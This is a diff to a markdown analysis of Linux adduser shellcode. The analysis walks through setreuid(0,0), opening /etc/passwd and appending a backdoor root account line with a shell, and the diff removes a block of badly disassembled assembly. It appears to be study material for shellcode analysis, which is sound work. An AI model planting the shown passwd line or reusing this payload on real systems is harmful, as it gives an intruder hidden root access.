@@ -23,6 +23,8 @@ stepi
 
 **The first thing the shellcode does is set the real and effective user id of the process to 0 (root)**
 
+![](img/adduser_setreuid.png)
+
 `setreuid(0, 0);`
 
 ```
@@ -34,6 +36,8 @@ stepi
 ```
 
 **Next open "/etc/passwd", which is the file where users are defined on linux**
+
+![](img/adduser_open.png)
 
 `int fd = open("/etc/passwd", 0x401);`
 
@@ -51,45 +55,19 @@ stepi
 00000023  CD80              int 0x80				; open(...)
 ```
 
-**Assembly code from here on was incorrectly disassembled by ndisasm. I will include it anyways, but What actually happens is:**
+**Assembly code from here on was incorrectly disassembled by ndisasm, so I won't include it. What happens is:**
 
 `buf` is a predefined series of characters with the value
 `"user:Azw17cTnnJAAA:0:0::/:/bin/sh\n"`
 
 The shellcode appends this line to "/etc/passwd"
+
+![](img/adduser_write.png)
+
 `write(fd, buf, len(buf));`
 
 Then the shellcode exits without setting a specific status code:
-`exit();`
 
-```
-00000025  93                xchg eax,ebx
-00000026  E822000000        call 0x4d				
-0000002B  7573              jnz 0xa0
-0000002D  65723A            gs jc 0x6a
-00000030  41                inc ecx
-00000031  7A77              jpe 0xaa
-00000033  3137              xor [edi],esi
-00000035  63546E6E          arpl [esi+ebp*2+0x6e],dx
-00000039  4A                dec edx
-0000003A  41                inc ecx
-0000003B  41                inc ecx
-0000003C  41                inc ecx
-0000003D  3A30              cmp dh,[eax]
-0000003F  3A30              cmp dh,[eax]
-00000041  3A3A              cmp bh,[edx]
-00000043  2F                das
-00000044  3A2F              cmp ch,[edi]
-00000046  62696E            bound ebp,[ecx+0x6e]
-00000049  2F                das
-0000004A  7368              jnc 0xb4
-0000004C  0A598B            or bl,[ecx-0x75]
-0000004F  51                push ecx
-00000050  FC                cld
-00000051  6A04              push byte +0x4
-00000053  58                pop eax
-00000054  CD80              int 0x80
-00000056  6A01              push byte +0x1
-00000058  58                pop eax
-00000059  CD80              int 0x80
-```
+![](img/adduser_exit.png)
+
+`exit();`
